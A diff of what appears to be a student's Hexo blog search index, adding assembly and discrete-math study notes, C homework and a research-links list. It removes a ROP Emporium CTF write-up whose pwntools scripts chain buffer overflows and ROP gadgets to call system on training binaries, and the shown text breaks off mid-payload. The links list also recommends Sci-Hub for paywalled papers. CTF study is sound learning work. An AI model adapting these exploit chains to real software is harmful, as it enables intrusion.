+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line"><span class="keyword">MOV</span> <span class="built_in">CX</span>, <span class="number">10</span></span><br><span class="line"><span class="symbol">L1:</span> </span><br><span class="line">    <span class="comment">; 循环体</span></span><br><span class="line">    <span class="keyword">LOOP</span> L1</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>子程序</strong>：<code>CALL PROC_NAME</code> + <code>RET</code>7</p>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="六、高级编程技术"><a href="#六、高级编程技术" class="headerlink" title="六、高级编程技术"></a>六、<strong>高级编程技术</strong></h3><ol>
+<li><p><strong>子程序与宏</strong></p>
+<ul>
+<li><p><strong>子程序</strong>：<code>NEAR</code>（段内调用），<code>FAR</code>（段间调用）</p>
+</li>
+<li><p><strong>宏定义</strong>：</p>
+<p>assembly</p>
+<p>复制</p>
+<p>下载</p>
+<figure class="highlight x86asm"><table><tr><td class="code"><pre><span class="line">PRINT MACRO MSG</span><br><span class="line">    <span class="keyword">LEA</span> <span class="built_in">DX</span>, MSG</span><br><span class="line">    <span class="keyword">MOV</span> <span class="number">AH</span>, <span class="number">09H</span></span><br><span class="line">    <span class="keyword">INT</span> <span class="number">21H</span></span><br><span class="line">ENDM</span><br></pre></td></tr></table></figure>
+</li>
+<li><p><strong>区别</strong>：宏展开代码长但速度快；子程序省空间但调用慢49</p>
+</li>
+</ul>
+</li>
+<li><p><strong>中断处理</strong></p>
+<ul>
+<li><strong>中断向量表</strong>：00000H~003FFH（1KB），每项4字节（CS:IP）4</li>
+<li><strong>DOS功能调用</strong>：<ul>
+<li><code>01H</code>：键盘输入 → <code>AL</code></li>
+<li><code>02H</code>：显示字符（<code>DL=ASCII</code>）</li>
+<li><code>09H</code>：显示字符串（<code>DS:DX=缓冲区首址</code>，以<code>$</code>结尾）</li>
+<li><code>0AH</code>：输入字符串（缓冲区格式：<code>[长度],[实际长度],[内容]</code>）37</li>
+</ul>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="七、调试与开发环境"><a href="#七、调试与开发环境" class="headerlink" title="七、调试与开发环境"></a>七、<strong>调试与开发环境</strong></h3><ol>
+<li><strong>程序开发流程</strong><ul>
+<li>编辑（.ASM）→ 汇编（.OBJ）→ 连接（.EXE）→ 调试（DEBUG）6</li>
+</ul>
+</li>
+<li><strong>DEBUG常用命令</strong><ul>
+<li><code>U</code>：反汇编，<code>T</code>：单步执行，<code>G</code>：断点执行，<code>D</code>：查看内存6</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="八、典型试题解析"><a href="#八、典型试题解析" class="headerlink" title="八、典型试题解析"></a>八、<strong>典型试题解析</strong></h3><ol>
+<li><p><strong>填空题</strong></p>
+<ul>
+<li>例：指令 <code>MOV AX, [BP+SI+2]</code> 的有效地址 &#x3D; <code>BP+SI+2</code>，物理地址 &#x3D; <code>SS×16 + 有效地址</code>14</li>
+</ul>
+</li>
+<li><p><strong>程序阅读</strong></p>
+<ul>
+<li>反转字符串程序关键点：<ul>
+<li><code>LEA DI, BUF+2</code>（字符串首）</li>
+<li><code>MOV SI, DI + AX -1</code>（字符串尾）</li>
+<li><code>XCHG AL, [DI]</code> 交换首尾字符7</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><p><strong>编程题</strong></p>
+<ul>
+<li><p>大小写转换：</p>
+<p>assembly</p>
+<p>复制</p>
+<p>下载</p>
+<figure class="highlight abnf"><table><tr><td class="code"><pre><span class="line"><span class="comment">; 大写转小写：OR AL, 00100000B</span></span><br><span class="line"><span class="comment">; 小写转大写：AND AL, 11011111B</span></span><br></pre></td></tr></table></figure>
+</li>
+<li><p>BCD码转二进制：按权展开求和37</p>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<p><strong>高分策略</strong>：</p>
+<ol>
+<li><strong>重点突破</strong>：物理地址计算、寻址方式、标志位判断（近3年高频考点）168。</li>
+<li><strong>刷题方向</strong>：<ul>
+<li>寄存器组合寻址（如 <code>[BX+SI+idata]</code>）</li>
+<li>移位指令应用（如 <code>SHL AX,1</code> 实现×2）</li>
+<li>DOS功能调用（09H&#x2F;0AH必考）79。</li>
+</ul>
+</li>
+<li><strong>考前模拟</strong>：完成2-3套真题（参考南邮&#x2F;郑大试题）37。</li>
+</ol>
+<blockquote>
+<p>💡 <strong>核心提示</strong>：考试中若遇复杂物理地址计算，先计算<code>段地址×16</code>再+偏移地址，注意十六进制进位（如<code>1000H×16=10000H</code>）。堆栈操作牢记“先进后出”，<code>PUSH</code>时<code>SP-2</code>，<code>POP</code>时<code>SP+2</code>610。</p>
+</blockquote>
 ]]></content>
   </entry>
   <entry>
@@ -211,15 +548,222 @@
 ]]></content>
   </entry>
   <entry>
-    <title>pwn之旅 （二）</title>
-    <url>/2024/11/16/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
-    <content><![CDATA[<h1 id="pwn之旅（二）"><a href="#pwn之旅（二）" class="headerlink" title="pwn之旅（二）"></a>pwn之旅（二）</h1><h2 id="一、初识GDB"><a href="#一、初识GDB" class="headerlink" title="一、初识GDB"></a>一、初识GDB</h2><p>1.设置断点 b（任意字母） *xxxxxxxx（地址）</p>
-<p> i b（对应字母）步入</p>
-<p>2.ni 单步</p>
-<p>3.i r 观察寄存器的值</p>
-<p>4.disassemble xxxxx（如$rip） 反编译</p>
-<p>5.j（xx）汇编指令</p>
-<p><img src="/pwn%E4%B9%8B%E6%97%85-%EF%BC%88%E4%BA%8C%EF%BC%89.assets/jcc.png" alt="jcc"></p>
+    <title>博客搭建</title>
+    <url>/2024/10/12/%E6%96%87%E7%AB%A0/</url>
+    <content><![CDATA[<h1 id="搭建心路"><a href="#搭建心路" class="headerlink" title="搭建心路"></a>搭建心路</h1><span id="more"></span>
+
+<h2 id="一、准备工具-环境"><a href="#一、准备工具-环境" class="headerlink" title="一、准备工具&#x2F;环境"></a>一、准备工具&#x2F;环境</h2><p>  一个趁手的魔法上网工具（GitHub真的好慢），node.js，hexo，typora，git（这玩意官网下也好慢）</p>
+<h2 id="二、博客的搭建"><a href="#二、博客的搭建" class="headerlink" title="二、博客的搭建"></a>二、博客的搭建</h2><p>  工欲善其事，必先利其器。为了流畅且丝滑的搭建博客，我浏览了一些B站视频，并从中选取了最短的一个来作为学习模板（懒狗一条了属于是）。在搭建过程中仅有一次报错，为“error deployer not found: git“，在 csdn上了解到，这是由于没有安装hexo-deployer-git插件，根据网址的教学运行npm install hexo-deployer-git –save便成功解决</p>
+<p>  搭建过程中并没有截什么图，便自然只有文字了</p>
+<h2 id="三、搭建过程"><a href="#三、搭建过程" class="headerlink" title="三、搭建过程"></a>三、搭建过程</h2><p>  1.安装所需软件并配置环境</p>
+<p>  2.去GitHub白嫖免费服务器并搞定ssh链接</p>
+<p> 3.更改一些_config.yaml下的配置</p>
+<p> 4.改个主题并部署网页</p>
+<h2 id="四、参考的视频以及文章"><a href="#四、参考的视频以及文章" class="headerlink" title="四、参考的视频以及文章"></a>四、参考的视频以及文章</h2><p>参考的视频以及文章</p>
+<p>  感谢各位前辈留下的宝贵资料</p>
+<p><a href="https://blog.csdn.net/qq_41688840/article/details/125826614">部署hexo遇到报错ERROR Deployer not found: git的解决办法-CSDN博客</a></p>
+<p>[<a href="https://www.bilibili.com/video/BV1Eg41157tL/?spm_id_from=333.337.search-card.all.click&vd_source=0a239ca12066e72b92ef0094a8ca6ef0">教程]Hexo &amp; Github搭建自己的专属博客_哔哩哔哩_bilibili</a></p>
+<h2 id="五、在搭建博客中有感"><a href="#五、在搭建博客中有感" class="headerlink" title="五、在搭建博客中有感"></a>五、在搭建博客中有感</h2><p>  博客的搭建需要一些耐心和善用搜索引擎，大部分问题前人都给了详尽的回答，我们只需要站在巨人的肩膀上，到虽然我没有遇到多少报错，但是从帮助舍友搭建博客时来看，几乎现阶段能遇到的所有报错都可以在网上找到解决方式，甚至有的报错只需要翻译一下就能看懂错在哪里。</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2024/10/12/%E6%B5%8B%E8%AF%95/</url>
+    <content><![CDATA[<span id="more"></span>
+
+<p>title: 测试<br>date: 2024-10-12 23:32:22<br>tags:text</p>
+<p>仅为测试使用</p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/07/03/%E7%A7%91%E7%A0%94%E5%B8%B8%E7%94%A8%E7%BD%91%E5%9D%80/</url>
+    <content><![CDATA[<h1 id="科研常用网址"><a href="#科研常用网址" class="headerlink" title="科研常用网址"></a>科研常用网址</h1><p>计算机领域如何寻找idea：加州大学河滨分校钱志云老师写的计算机领域如何找idea的一篇文章。（需要科学上网才能访问）</p>
+<p>如何阅读一篇论文：来源于滑铁卢大学Keshav教授。分享了一种“Three-pass”的方法。分三遍去读，每一遍都有明确的目标，是循序渐进的过程</p>
+<p>给博士生的建议：港科大教授Dimitris Papadias写的。从很多方面给出了建议，包括goal、motivation、presentation、paper writing等等</p>
+<p>学术论⽂写作⽅法和技巧：清华大学刘洋老师的论文写作技巧和科研经验分享。</p>
+<p>写好英语科技论文的诀窍：印地安那大学周耀旗老师的论文写作技巧分享。</p>
+<p>英文学术写作实战：国科大Torsten老师讲的论文写作课。</p>
+<p>工具</p>
+<p>The Writer’s Diet：学术写作课老师推荐的网址，可以检查英语写得地不地道<br>grammarly：检查有没有出现语法错误的工具<br>phrasebank：曼切斯特大学整理的论文常用句式<br>Overleaf, Online LaTeX Editor：在线的latex编辑器<br>如何建立独属于你自己的论文数据库：清华网安博士生写的一个利用zotero和dblp建立自己的论文数据库的教程。其实也是推荐一些文献管理工具。<br>ccf ddl：CCF列表会议的截止日期列表<br>dblp: computer science bibliography：检索论文的网站，可以配合一些文献整理工具（如zotero）一键导入生成bib。<br>计算机最新国际会议和期刊列表 - Conference Partner (会伴)：收集了会议的接收率，截止日期，ccf类别等信息的网站，适合在投稿的时候找会议期刊用。<br>connected paper：调研神器。给定一个论文，能找到与他相关的论文。<br>sci-hub：下论文神器。遇到收费的论文，把论文的doi复制到这个网址，就能下载论文了。<br>github：能找到很多开源工作和大佬的主页，除此之外，awesome-list能找到相当多的资源，如awesome-fuzz就能找到模糊测试相关的课程、项目、论文等资源。<br>conference rank：能查看会议的排名，主要是查ERA和qualis的弄的排名<br>google h5:可以查会议的H5指数。某种角度能看出会议的录取难度。<br>latex画图：<br><a href="https://www.tablesgenerator.com/">https://www.tablesgenerator.com/</a><br><a href="https://www.latex-tables.com/">https://www.latex-tables.com/</a></p>
+<p>原文链接：<a href="https://blog.csdn.net/u013648063/article/details/122048461">https://blog.csdn.net/u013648063/article/details/122048461</a></p>
+]]></content>
+  </entry>
+  <entry>
+    <title></title>
+    <url>/2025/06/23/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%EF%BC%88%E6%A0%B8%E5%BF%83%E5%9F%BA%E7%A1%80%EF%BC%89/</url>
+    <content><![CDATA[<h3 id="一、命题逻辑（核心基础）"><a href="#一、命题逻辑（核心基础）" class="headerlink" title="一、命题逻辑（核心基础）"></a><strong>一、命题逻辑（核心基础）</strong></h3><ol>
+<li><strong>命题符号化</strong><ul>
+<li>原子命题识别、联结词（¬∧∨→↔）的精确转化</li>
+<li>例题：<code>¬T ↔ (¬S → t)</code> 的自然语言解释（成年规则与身高条件的等价性）</li>
+</ul>
+</li>
+<li><strong>公式分类与化简</strong><ul>
+<li>永真式（重言式）、永假式（矛盾式）、可满足式</li>
+<li><strong>化简方法</strong>：逻辑等价式（德摩根律、分配律、吸收律等）</li>
+<li>重点题型：<code>((¬P∨Q)↔(Q∨¬P))∧P</code> → 简化为 <code>P</code></li>
+</ul>
+</li>
+<li><strong>范式理论（考试重点）</strong><ul>
+<li><strong>主析取范式（PDNF）</strong>：极小项析取 → <strong>求所有成真赋值</strong></li>
+<li><strong>主合取范式（PCNF）</strong>：极大项合取 → <strong>求所有成假赋值</strong></li>
+<li>步骤：真值表→按赋值构造极小项&#x2F;极大项→析取&#x2F;合取</li>
+</ul>
+</li>
+<li><strong>演绎证明</strong><ul>
+<li>推理规则：MP（假言推理）、MT（拒取式）、HS（三段论）、DS（析取三段论）</li>
+<li>解题流程：符号化前提→逐步推导→验证结论有效性</li>
+<li>典型题：<em>“若6偶则2不整除7；5非素或2整除7；5是素。故6奇”</em> 的真伪验证</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="二、谓词逻辑（进阶难点）"><a href="#二、谓词逻辑（进阶难点）" class="headerlink" title="二、谓词逻辑（进阶难点）"></a><strong>二、谓词逻辑（进阶难点）</strong></h3><ol>
+<li><strong>符号化关键</strong><ul>
+<li>量词（∀∃）的辖域与顺序（<code>∀x∃y</code> vs <code>∃y∀x</code> 差异显著）</li>
+<li>案例：<em>“所有学员钦佩某些老师”</em> → <code>∀x(S(x)→∃y(T(y)∧A(x,y)))</code></li>
+</ul>
+</li>
+<li><strong>演绎证明</strong><ul>
+<li><strong>规则拓展</strong>：UI（全称实例化）、EI（存在实例化）、UG（全称推广）、EG（存在推广）</li>
+<li><strong>核心限制</strong>：EI引入<strong>新常元</strong>；UG仅用于<strong>任意常元</strong></li>
+<li>经典题：<code>∃xP(x)→∀y[(P(y)∨Q(y))→R(y)], ∃xP(x) ⇒ ∃xR(x)</code> 的证明构造</li>
+</ul>
+</li>
+<li><strong>应用题型</strong><ul>
+<li>符号化复杂命题（如实数分类问题）</li>
+<li>用谓词逻辑证明结论（例：从前提推导存在有理数）</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="三、集合与二元关系（高频考点）"><a href="#三、集合与二元关系（高频考点）" class="headerlink" title="三、集合与二元关系（高频考点）"></a><strong>三、集合与二元关系（高频考点）</strong></h3><ol>
+<li><p><strong>集合运算</strong></p>
+<ul>
+<li>交并差补（∩∪−）、对称差（Δ）、幂集（P(A)）</li>
+<li>包含关系：子集（⊆）、真子集（⊂）、集合相等</li>
+</ul>
+</li>
+<li><p><strong>二元关系性质</strong></p>
+<ul>
+<li><strong>五大性质判定</strong>：自反性、对称性、传递性、反自反性、反对称性</li>
+<li><strong>判定工具</strong>：关系矩阵（主对角线&#x2F;对称性）、关系图（自环&#x2F;双向边）</li>
+<li><strong>闭包运算</strong>：自反闭包（<code>r(R)=R∪I_A</code>）、对称闭包（<code>s(R)=R∪R⁻¹</code>）</li>
+</ul>
+</li>
+<li><p><strong>特殊关系</strong></p>
+<ul>
+<li><p><strong>等价关系</strong>：自反+对称+传递 → 等价类与商集（<code>A/~</code>）</p>
+</li>
+<li><p><strong>偏序关系</strong>：自反+反对称+传递 → <strong>哈斯图绘制</strong></p>
+<ul>
+<li>哈斯图简化：去自环、去传递边、箭头向上</li>
+</ul>
+</li>
+<li><p><strong>元素判定</strong>（重点！）：</p>
+<table>
+<thead>
+<tr>
+<th align="left">概念</th>
+<th align="left">定义</th>
+<th align="left">唯一性</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="left">最大&#x2F;最小元</td>
+<td align="left">所有元素≤g &#x2F; ≥l</td>
+<td align="left">至多一个</td>
+</tr>
+<tr>
+<td align="left">极大&#x2F;极小元</td>
+<td align="left">无更大元素 &#x2F; 无更小元素</td>
+<td align="left">可有多个</td>
+</tr>
+<tr>
+<td align="left">上&#x2F;下界</td>
+<td align="left">子集中所有元素≤u &#x2F; ≥l</td>
+<td align="left">可不存在</td>
+</tr>
+<tr>
+<td align="left">上&#x2F;下确界</td>
+<td align="left">上界的最小元&#x2F;下界的最大元</td>
+<td align="left">唯一</td>
+</tr>
+</tbody></table>
+</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="四、图论（核心应用）"><a href="#四、图论（核心应用）" class="headerlink" title="四、图论（核心应用）"></a><strong>四、图论（核心应用）</strong></h3><ol>
+<li><strong>图基础</strong><ul>
+<li>握手定理：无向图 <code>∑deg(v)=2|E|</code>；有向图 <code>∑deg⁺(v)=∑deg⁻(v)=|E|</code></li>
+<li>同构判定：顶点数、边数、度序列、子图结构匹配</li>
+</ul>
+</li>
+<li><strong>树与生成树</strong><ul>
+<li>树定义（连通无环 &amp; |E|&#x3D;|V|-1）</li>
+<li><strong>最小生成树算法</strong>：<ul>
+<li>Kruskal：按边权升序+避圈（并查集实现）</li>
+<li>Prim：从点出发+贪心选最小边（优先队列实现）</li>
+</ul>
+</li>
+</ul>
+</li>
+<li><strong>特殊图判定（重点！）</strong><ul>
+<li><strong>欧拉图</strong>：所有顶点度偶 → <strong>存在回路</strong></li>
+<li><strong>欧拉通路</strong>：恰两顶点度奇 → <strong>存在通路</strong></li>
+<li><strong>偶图</strong>：无奇圈（充要条件）</li>
+<li><strong>哈密顿图</strong>：必要条件（删k顶点后≤k连通分量）；充分条件（Dirac定理：<code>δ(G)≥n/2</code>）</li>
+<li><strong>平面图</strong>：必要条件（<code>e≤3v-6</code>）；充要条件（Kuratowski定理：不含K₅&#x2F;K₃,₃细分）</li>
+</ul>
+</li>
+<li><strong>矩阵表示</strong><ul>
+<li>邻接矩阵A的k次幂：<code>Aᵏ[i][j]</code> &#x3D; i到j长度为k的路径数</li>
+<li>应用：计算结点间通路数量</li>
+</ul>
+</li>
+</ol>
+<hr>
+<h3 id="五、复习策略"><a href="#五、复习策略" class="headerlink" title="五、复习策略"></a><strong>五、复习策略</strong></h3><ol>
+<li><strong>优先级排序</strong>：<ul>
+<li>命题逻辑（范式&#x2F;证明） &gt; 二元关系（性质&#x2F;偏序） &gt; 图论（特殊图判定） &gt; 谓词逻辑（证明）</li>
+</ul>
+</li>
+<li><strong>应试技巧</strong>：<ul>
+<li>哈斯图元素判定：画图后分层观察</li>
+<li>范式计算：真值表法最可靠</li>
+<li>闭包运算：传递闭包用<code>t(R)=R⁺</code>（Warshall算法）</li>
+</ul>
+</li>
+<li><strong>高频错题</strong>：<ul>
+<li>反对称性 vs 反自反性</li>
+<li>极大元 vs 最大元</li>
+<li><code>∀x∃y</code> 与 <code>∃y∀x</code> 的语义差异</li>
+</ul>
+</li>
+</ol>
+]]></content>
+  </entry>
+  <entry>
+    <title>整数溢出</title>
+    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A1/</url>
+    <content><![CDATA[]]></content>
+  </entry>
+  <entry>
+    <title>编程作业2</title>
+    <url>/2024/11/04/%E7%BC%96%E7%A8%8B%E4%BD%9C%E4%B8%9A2/</url>
+    <content><![CDATA[<h2 id="1、【程序文件名】zy-1-cpp"><a href="#1、【程序文件名】zy-1-cpp" class="headerlink" title="1、【程序文件名】zy-1.cpp"></a>1、【程序文件名】zy-1.cpp</h2><p>【题目描述】编写一个程序，功能是：输入两个整数，变量值交换后输出，输出时两个整数间用一个空格隔开。如输入：12 34，则输出：34 12</p>
+<span id="more"></span>
+
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> num1, num2, temp;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d %d&quot;</span>, &amp;num1, &amp;num2);</span><br><span class="line">    temp = num1; </span><br><span class="line">    num1 = num2; </span><br><span class="line">    num2 = temp; </span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%d %d&quot;</span>, num1, num2);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="2、【程序文件名】zy-2-cpp"><a href="#2、【程序文件名】zy-2-cpp" class="headerlink" title="2、【程序文件名】zy-2.cpp"></a>2、【程序文件名】zy-2.cpp</h2><p>【题目描述】编写一个程序，功能是：求<br>$$<br>√(|x^3-5| )&#x2F;(e^x+3)。<br>$$<br>。其中，x为浮点数，由键盘输入。计算后输出y的值（显示两位小数)。如输入：3.5，则输出：0.17，输入：-1.2，则输出：0.79。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;math.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">float</span> x, y;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%f&quot;</span>, &amp;x);</span><br><span class="line">    y = <span class="built_in">sqrt</span>(<span class="built_in">fabs</span>(<span class="built_in">pow</span>(x, <span class="number">3</span>) - <span class="number">5</span>)) / (<span class="built_in">exp</span>(x) + <span class="number">3</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%.2f&quot;</span>, y);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h3 id="3、【程序文件名】zy-3-cpp"><a href="#3、【程序文件名】zy-3-cpp" class="headerlink" title="3、【程序文件名】zy-3.cpp"></a>3、【程序文件名】zy-3.cpp</h3><p>【题目描述】编写一个程序，功能是：输入一个年份，判断它是否为闰年。其中，闰年的年份满足以下两个条件之一：一是能被400整除；二是能被4整除，但不能被100整除。如输入：2024，则输出：Y；输入：2022，输出：N。</p>
+<p>  要求：使用条件运算符，不使用if语句。</p>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="type">int</span> year;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;year);</span><br><span class="line">    <span class="type">char</span> isLeapYear = (year % <span class="number">400</span> == <span class="number">0</span> || (year % <span class="number">4</span> == <span class="number">0</span> &amp;&amp; year % <span class="number">100</span> != <span class="number">0</span>)) ? <span class="string">&#x27;Y&#x27;</span> : <span class="string">&#x27;N&#x27;</span>;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;%c\n&quot;</span>, isLeapYear);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 ]]></content>
   </entry>
   <entry>
@@ -242,87 +786,6 @@
 ]]></content>
   </entry>
   <entry>
-    <title></title>
-    <url>/2025/02/14/ROP%20Emporium%EF%BC%8864%EF%BC%89%20WP/</url>
-    <content><![CDATA[<h1 id="ROP-Emporium（64）-WP"><a href="#ROP-Emporium（64）-WP" class="headerlink" title="ROP Emporium（64） WP"></a>ROP Emporium（64） WP</h1><h2 id="1-ret2win"><a href="#1-ret2win" class="headerlink" title="1.ret2win"></a>1.ret2win</h2><p>找到后门函数ret2win的地址，利用缓冲区溢出覆盖返回地址</p>
-<p>exp</p>
-<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./ret2win&#x27;</span>)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, cyclic(<span class="number">40</span>) + p64(<span class="number">0x400756</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="2-split"><a href="#2-split" class="headerlink" title="2.split"></a>2.split</h2><p>与ret2win大致相同，只不过这题将后门执行的命令由<code>cat flag</code>改为了<code>/bin/ls</code>，因此不能直接获取flag，但程序中给出了<code>/bin/cat flag.txt</code>这个字符串，所以只需要构造简单的ROP链就可以获取flag<img src="https://p.sda1.dev/22/d0fbba4df9c580e19acafa6f97dde4a1/image-20250214095002976.png" alt="image-20250214095002976.png"><img src="https://p.sda1.dev/22/a535261d95bc230a50941ba1fb3ea46b/image-20250214095031390.png" alt="image-20250214095031390.png">直接使用gadget将参数pop到rdi中即可。</p>
-<p>exp</p>
-<figure class="highlight clean"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">useful_string = <span class="number">0x601060</span></span><br><span class="line">rdi = <span class="number">0x4007c3</span></span><br><span class="line">elf = ELF(<span class="string">&#x27;./split&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = b<span class="string">&#x27;a&#x27;</span>*(<span class="number">32</span> + <span class="number">8</span>) + p64(rdi) + p64(useful_string) + p64(elf.plt[<span class="string">&#x27;system&#x27;</span>])</span><br><span class="line"></span><br><span class="line">p.sendlineafter(b<span class="string">&#x27;&gt; &#x27;</span>, payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="3-callme"><a href="#3-callme" class="headerlink" title="3.callme"></a>3.callme</h2><p>与第二题类似，通过ROPgadget找到对应gadget地址为0x40093c。<img src="https://p.sda1.dev/22/1cb41ee50c7c5fcaeaa5e33ef07c56c9/image-20250214100130272.png">题目里的usefulfunction也给了提示，就是让我们连续调用三个函数，并用正确的顺序和参数调用<img src="https://p.sda1.dev/22/10ea289a8a1c2305ecd3385d744cba2a/image-20250214101459928.png"></p>
-<p>然后直接构造payload即可</p>
-<p>exp</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./callme&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">one</span> = <span class="number">0</span><span class="variable">x400720</span></span><br><span class="line"><span class="variable">two</span> = <span class="number">0</span><span class="variable">x400740</span></span><br><span class="line"><span class="variable">three</span> = <span class="number">0</span><span class="variable">x4006f0</span></span><br><span class="line"><span class="variable">ret</span> = <span class="number">0</span><span class="variable">x40093c</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span class="string">&#x27;A&#x27;</span> *<span class="number">40</span> + <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">one</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">two</span>)</span></span><br><span class="line"><span class="variable">payload</span> += <span class="function"><span class="title">p64</span>(<span class="variable">ret</span>) + <span class="title">p64</span>(<span class="number">0</span><span class="variable">xDEADBEEFDEADBEEF</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xCAFEBABECAFEBABE</span>)+<span class="title">p64</span>(<span class="number">0</span><span class="variable">xD00DF00DD00DF00D</span>) + <span class="title">p64</span>(<span class="variable">three</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">p.sendline</span>(<span class="variable">payload</span>)</span><br><span class="line"></span><br><span class="line"><span class="variable">p.interactive</span>()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="4-write4"><a href="#4-write4" class="headerlink" title="4.write4"></a>4.write4</h2><p>用ida分析给出来的几个文件，发现libc中的print_file函数是个可以打印文件内容的函数，那这题就是用栈溢出，跳转到print_file函数去获取到flag。因此，主要是利用两个gadget来实现写字符串到data段。![image-20250214104036505](ROP Emporium（64） WP.assets&#x2F;image-20250214104036505.png)![image-20250214104227536](ROP Emporium（64） WP.assets&#x2F;image-20250214104227536.png)</p>
-<p>得到pop_r14_r15 &#x3D; 0x400690</p>
-<p>![image-20250214104448963](ROP Emporium（64） WP.assets&#x2F;image-20250214104448963.png)</p>
-<p>得到mov_r14_r15 &#x3D; 0x400628</p>
-<p>ida下拉找到data段地址![image-20250214104743879](ROP Emporium（64） WP.assets&#x2F;image-20250214104743879.png)构造exp</p>
-<figure class="highlight isbl"><table><tr><td class="code"><pre><span class="line"><span class="variable">from</span> <span class="variable">pwn</span> <span class="variable">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="variable">p</span> = <span class="function"><span class="title">process</span>(<span class="string">&quot;./write4&quot;</span>)</span></span><br><span class="line"></span><br><span class="line"><span class="variable">bss</span> = <span class="number">0</span><span class="variable">x601038</span></span><br><span class="line"><span class="variable">mov_r14_r15</span> = <span class="number">0</span><span class="variable">x400628</span></span><br><span class="line"><span class="variable">pop_r14_r15</span> = <span class="number">0</span><span class="variable">x400690</span></span><br><span class="line"><span class="variable">print_file</span> = <span class="number">0</span><span class="variable">x400510</span></span><br><span class="line"><span class="variable">data</span> = <span class="number">0</span><span class="variable">x601028</span></span><br><span class="line"><span class="variable">pop_rdi</span> = <span class="number">0</span><span class="variable">x400693</span></span><br><span class="line"></span><br><span class="line"><span class="variable">payload</span> = <span class="variable">b</span><span 